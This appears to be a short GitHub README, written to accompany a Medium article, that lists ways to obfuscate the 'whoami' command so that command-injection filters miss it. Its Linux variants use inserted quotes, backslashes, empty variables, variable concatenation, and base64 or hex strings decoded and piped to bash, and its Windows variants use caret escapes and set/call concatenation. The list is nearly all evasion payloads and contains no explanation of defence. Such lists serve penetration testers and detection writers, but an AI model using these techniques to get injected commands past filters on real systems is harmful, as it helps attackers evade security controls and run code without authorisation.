
# Code Exec Evasion

These are the examples from my [Article](https://medium.com/@m0r3h4x/multiple-ways-but-only-one-goal-a-look-into-code-execution-evasion-methods-546e241d399f) : 

# Linux : 
- ‘whoam’i

- w’h’oami

- wh’’oami

- w``h’’oa’m’i

- w’’h’’oa’’’’’’’’’m’i

- wh’’’’’’’’’’’’’’’’’’’’’’’’’’o’’’’’’’’ami

- who”ami

- wh”o”ami

- who””ami
- who\ami

- wh\o\ami

- w\h\o\a\m\i

- w\h\oa\mi
- wh\`echo`oami

- wh$(echo)oami
- wh$*oami

- wh$@oami

- wh$1oami

- wh$*o$*$*ami
- a=w;b=ho;c=ami;$a$b$c

- echo “d2hvYW1p”|base64 -d|bash

- \`echo’d2hvYW1p’|base64 -d`

- $(echo’d2hvYW1p’|base64 -d)

- echo 77686F616D69 | xxd -r -p |bash
- wh${PATH:2:1}${PATH:19:1}mi 
# Windows : 

- set a=who&&set b=ami && call %a%%b%
- w^hoami

- w^h^oami

- w^h^o^a^m^i
- who”ami

- wh”o”ami

- who””ami

## Authors

- [@morhax](https://www.github.com/morhax)

